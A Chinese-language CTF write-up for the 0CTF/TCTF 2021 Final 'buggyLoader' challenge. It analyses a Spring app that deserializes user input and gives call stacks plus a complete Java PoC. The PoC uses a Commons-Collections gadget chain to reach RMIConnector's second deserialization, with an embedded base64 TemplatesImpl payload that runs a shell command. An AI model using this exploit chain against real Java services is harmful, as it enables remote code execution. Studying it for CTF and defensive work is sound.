date: 2021-11-19
categories:
- 比赛
tags:
- wp
- ctf
title: buggyLoader
---
# buggyLoader



## 参考资料



https://github.com/c014/0CTF-2021-Final-RevengePHP-and-buggyLoader-exp/blob/main/buggyLoader/Poc.java

http://pipinstall.cn/2021/10/01/TCTF2021%E6%80%BB%E5%86%B3%E8%B5%9B2%E8%A7%A3Java%E4%B8%8EBypass%20Shiro550%20ClassLoader.loadClass/

https://hpdoger.cn/2021/10/08/title:%20TCTF2021-final-writeup-1/#bugglyloader

https://xz.aliyun.com/t/7950

```
urls = {URL[35]@5409} 
 0 = {URL@5410} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/classes!/"
 1 = {URL@5411} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-boot-2.4.4.jar!/"
 2 = {URL@5412} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-boot-autoconfigure-2.4.4.jar!/"
 3 = {URL@5413} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/logback-classic-1.2.3.jar!/"
 4 = {URL@5414} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/logback-core-1.2.3.jar!/"
 5 = {URL@5415} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/log4j-to-slf4j-2.13.3.jar!/"
 6 = {URL@5416} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/log4j-api-2.13.3.jar!/"
 7 = {URL@5417} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jul-to-slf4j-1.7.30.jar!/"
 8 = {URL@5418} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jakarta.annotation-api-1.3.5.jar!/"
 9 = {URL@5419} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/snakeyaml-1.27.jar!/"
 10 = {URL@5420} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/thymeleaf-spring5-3.0.12.RELEASE.jar!/"
 11 = {URL@5421} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/thymeleaf-3.0.12.RELEASE.jar!/"
 12 = {URL@5422} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/attoparser-2.0.5.RELEASE.jar!/"
 13 = {URL@5423} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar!/"
 14 = {URL@5424} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/slf4j-api-1.7.30.jar!/"
 15 = {URL@5425} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/thymeleaf-extras-java8time-3.0.4.RELEASE.jar!/"
 16 = {URL@5426} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-databind-2.11.4.jar!/"
 17 = {URL@5427} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-annotations-2.11.4.jar!/"
 18 = {URL@5428} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-core-2.11.4.jar!/"
 19 = {URL@5429} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-datatype-jdk8-2.11.4.jar!/"
 20 = {URL@5430} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-datatype-jsr310-2.11.4.jar!/"
 21 = {URL@5431} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-module-parameter-names-2.11.4.jar!/"
 22 = {URL@5432} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/tomcat-embed-core-9.0.44.jar!/"
 23 = {URL@5433} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jakarta.el-3.0.3.jar!/"
 24 = {URL@5434} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/tomcat-embed-websocket-9.0.44.jar!/"
 25 = {URL@5435} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-web-5.3.5.jar!/"
 26 = {URL@5436} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-beans-5.3.5.jar!/"
 27 = {URL@5437} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-webmvc-5.3.5.jar!/"
 28 = {URL@5438} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-aop-5.3.5.jar!/"
 29 = {URL@5439} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-context-5.3.5.jar!/"
 30 = {URL@5440} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-expression-5.3.5.jar!/"
 31 = {URL@5441} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-core-5.3.5.jar!/"
 32 = {URL@5442} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-jcl-5.3.5.jar!/"
 33 = {URL@5443} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/commons-collections-3.2.1.jar!/"
 34 = {URL@5444} "jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-boot-jarmode-layertools-2.4.4.jar!/"
```



## 题目分析

给了个Jar包，把源文件搞出来一下，配一下调试环境





```java
public class IndexController {
   @RequestMapping({"/buggy"})
   public String index(@RequestParam(name = "data",required = true) String data, Model model) throws Exception {
      byte[] b = Utils.hexStringToBytes(data);
      InputStream inputStream = new ByteArrayInputStream(b);//
      ObjectInputStream objectInputStream = new MyObjectInputStream(inputStream);//ObjectInputStream干啥的,使用ObjectInputStream来读取一些元数据
      objectInputStream.readObject();

      return "index";
   }
}
```



题目很简单就一个反序列化(删除了一些代码)

MyObjectInputStream:

```java
public class MyObjectInputStream extends ObjectInputStream {
   private ClassLoader classLoader;

   public MyObjectInputStream(InputStream inputStream) throws Exception {
      super(inputStream);
      URL[] urls = ((URLClassLoader)Transformer.class.getClassLoader()).getURLs();
      this.classLoader = new URLClassLoader(urls);
   }

   protected Class resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
      System.out.println(desc.getName());
      Class clazz = this.classLoader.loadClass(desc.getName());
      return clazz;
   }
}
```

这就是全部的代码了

这题还是考之前的shiro反序列化利用过程中遇到Shiro重写了 resolveClass 的实现



关于这个的分析文章可以参考

https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html

http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html

https://blog.zsxsoft.com/post/35

https://xz.aliyun.com/t/7950



## sink:二次反序列化

调用栈:

```
findRMIServerJRMP:2007, RMIConnector (javax.management.remote.rmi) //二次反序列化触发点
findRMIServer:1924, RMIConnector (javax.management.remote.rmi)
connect:287, RMIConnector (javax.management.remote.rmi)
connect:249, RMIConnector (javax.management.remote.rmi)// 进入rmi
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
transform:126, InvokerTransformer (org.apache.commons.collections.functors)
get:158, LazyMap (org.apache.commons.collections.map)
getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)
hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)
hash:339, HashMap (java.util)
put:612, HashMap (java.util)
readObject:342, HashSet (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1170, ObjectStreamClass (java.io)
readSerialData:2178, ObjectInputStream (java.io)
readOrdinaryObject:2069, ObjectInputStream (java.io)
readObject0:1573, ObjectInputStream (java.io)
readObject:431, ObjectInputStream (java.io)//反序列化起点
```

这一解给了一个新的sink点

通过cc链来调javax.management.remote.rmi.RMIConnector.connect从而完成二次反序列化



### 二次反序列化的触发过程

触发点是javax.management.remote.rmi.RMIConnector.connect，他回去解析jmxServiceURL



```java
public synchronized void connect(Map<String,?> environment)
    throws IOException {
		...

        try {
			...
            RMIServer stub = (rmiServer!=null)?rmiServer:
                findRMIServer(jmxServiceURL, usemap);

            // Check for secure RMIServer stub if the corresponding
            // client-side environment property is set to "true".
            //
            ...
        } catch (IOException e) {
            ...
        }
    }

```

进入findRMIServer，接着进入findRMIServerJRMP

```java
private RMIServer findRMIServer(JMXServiceURL directoryURL,
        Map<String, Object> environment)
        throws NamingException, IOException {
    final boolean isIiop = RMIConnectorServer.isIiopURL(directoryURL,true);
    if (isIiop) {
        // Make sure java.naming.corba.orb is in the Map.
        environment.put(EnvHelp.DEFAULT_ORB,resolveOrb(environment));
    }

    String path = directoryURL.getURLPath();
    int end = path.indexOf(';');
    if (end < 0) end = path.length();
    if (path.startsWith("/jndi/"))
        return findRMIServerJNDI(path.substring(6,end), environment, isIiop);
    else if (path.startsWith("/stub/"))
        return findRMIServerJRMP(path.substring(6,end), environment, isIiop);//进入findRMIServerJRMP
    else if (path.startsWith("/ior/")) {
        if (!IIOPHelper.isAvailable())
            throw new IOException("iiop protocol not available");
        return findRMIServerIIOP(path.substring(5,end), environment, isIiop);
    } else {
        final String msg = "URL path must begin with /jndi/ or /stub/ " +
                "or /ior/: " + path;
        throw new MalformedURLException(msg);
    }
}
```



在findRMIServerJRMP触发反序列化

```java
private RMIServer findRMIServerJRMP(String base64, Map<String, ?> env, boolean isIiop)
    throws IOException {
    // could forbid "iiop:" URL here -- but do we need to?
    final byte[] serialized;
    try {
        serialized = base64ToByteArray(base64);
    } catch (IllegalArgumentException e) {
        throw new MalformedURLException("Bad BASE64 encoding: " +
                e.getMessage());
    }
    final ByteArrayInputStream bin = new ByteArrayInputStream(serialized);

    final ClassLoader loader = EnvHelp.resolveClientClassLoader(env);
    final ObjectInputStream oin =
            (loader == null) ?
                new ObjectInputStream(bin) :
                new ObjectInputStreamWithLoader(bin, loader);
    final Object stub;
    try {
        stub = oin.readObject();// look here
    } catch (ClassNotFoundException e) {
        throw new MalformedURLException("Class not found: " + e);
    }
    return (RMIServer)stub;
}
```

从而绕过限定URLClassLoader的尴尬限制



### 调用connect

接着就是ccx的老链了：

```
transform:126, InvokerTransformer (org.apache.commons.collections.functors)
get:158, LazyMap (org.apache.commons.collections.map)
getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)
hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)
hash:339, HashMap (java.util)
put:612, HashMap (java.util)
readObject:342, HashSet (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1170, ObjectStreamClass (java.io)
readSerialData:2178, ObjectInputStream (java.io)
readOrdinaryObject:2069, ObjectInputStream (java.io)
readObject0:1573, ObjectInputStream (java.io)
readObject:431, ObjectInputStream (java.io)
```

HashSet::readObject->HashMap::put->HashMap::hash->TiedMapEntry::hashCOde->TiedMapEntry::getValue->LazyMap::get->Transformer::transform



### exp

```java
package com.yxxx.buggyLoader;

/**
 * @author : ccreater
 * @ClassName : com.yxxx.buggyLoader.Poc
 * @Description : 类描述
 * @date : 2021-11-19 14:09 Copyright  2021 ccreater. All rights reserved.
 */
import org.apache.catalina.deploy.NamingResourcesImpl;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.attoparser.ParseException;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import javax.security.auth.message.AuthException;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpFilter;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

import java.util.*;



public class Poc {
  public static void main(String[] args) throws Exception{
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(baos);

    Constructor con = InvokerTransformer.class.getDeclaredConstructor(String.class);
    con.setAccessible(true);
    // need a public method
    InvokerTransformer transformer = (InvokerTransformer) con.newInstance("connect");

    // rO0A.. from Temp.java
    JMXServiceURL jurl = new JMXServiceURL("service:jmx:rmi://c014:37777/stub/rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRv"
        + "cmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznB"
        + "H9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4"
        + "cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0"
        + "ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0"
        + "ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2"
        + "YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGll"
        + "czt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAA"
        + "AozK/rq+AAAANAAkCgADAA8HABEHABIBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJl"
        + "clRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAC1N0YXRpY0Jsb2NrAQAMSW5uZXJD"
        + "bGFzc2VzAQAnTGNvbS95eHh4L2J1Z2d5TG9hZGVyL1RlbXAkU3RhdGljQmxvY2s7AQAKU291cmNl"
        + "RmlsZQEACVRlbXAuamF2YQwABAAFBwATAQAlY29tL3l4eHgvYnVnZ3lMb2FkZXIvVGVtcCRTdGF0"
        + "aWNCbG9jawEAEGphdmEvbGFuZy9PYmplY3QBABljb20veXh4eC9idWdneUxvYWRlci9UZW1wAQBA"
        + "Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RU"
        + "cmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAGAEACmdldFJ1"
        + "bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABoAGwoAGQAcAQAQdG91Y2ggL3RtcC9mdWNr"
        + "IAgAHgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMACAA"
        + "IQoAGQAiACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgAB"
        + "AAAAFAAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAWAAIAAAAAAAq4AB0SH7YAI1exAAAA"
        + "AAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJcHQABG5hbWVwdwEAeHNyACpvcmcuYXBhY2hlLmNv"
        + "bW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3Jn"
        + "L2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUu"
        + "Y29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIA"
        + "A1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1lcQB+AAlbAAtpUGFy"
        + "YW1UeXBlc3EAfgAIeHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAO"
        + "bmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAABzcgAR"
        + "amF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9A"
        + "AAAAAAAAdwgAAAAQAAAAAHh4eA==");

    Map hashMapp = new HashMap();
    RMIConnector rc = new RMIConnector(jurl,hashMapp);

    Map hashMap = new HashMap();
    Map lazyMap = LazyMap.decorate(hashMap, transformer);

    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rc);


    HashSet hashSet = new HashSet(1);
    hashSet.add("c014");
    Field fmap = hashSet.getClass().getDeclaredField("map");
    fmap.setAccessible(true);
    HashMap innimpl = (HashMap) fmap.get(hashSet);
    Field ftable = hashMap.getClass().getDeclaredField("table");
    ftable.setAccessible(true);
    Object[] nodes =(Object[])ftable.get(innimpl);
    Object node = nodes[1];
    Field fnode = node.getClass().getDeclaredField("key");
    fnode.setAccessible(true);
    fnode.set(node, tiedMapEntry);


    oos.writeUTF("0CTF/TCTF");
    oos.writeInt(2021);
    oos.writeObject(hashSet);
    oos.close();

    byte[] exp = baos.toByteArray();
    String data = com.yxxx.buggyLoader.Utils.bytesTohexString(exp);
    System.out.println(data);


  }
}
```





## openConnection盲注flag

https://github.com/ceclin/0ctf-2021-finals-soln-buggy-loader/blob/main/app/src/main/kotlin/ccl/Blind.kt

自己看writeup.jpg

